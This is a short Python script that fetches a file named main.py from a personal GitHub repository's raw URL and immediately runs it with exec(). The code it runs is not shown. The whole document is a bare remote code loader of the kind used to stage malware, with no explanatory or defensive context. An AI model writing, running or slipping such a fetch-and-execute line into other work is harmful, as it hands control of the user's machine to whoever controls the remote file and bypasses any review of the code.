import requests 
rr = requests.get("https://raw.githubusercontent.com/ibrahimmaliraqi/test/main/main.py").text
exec(rr)
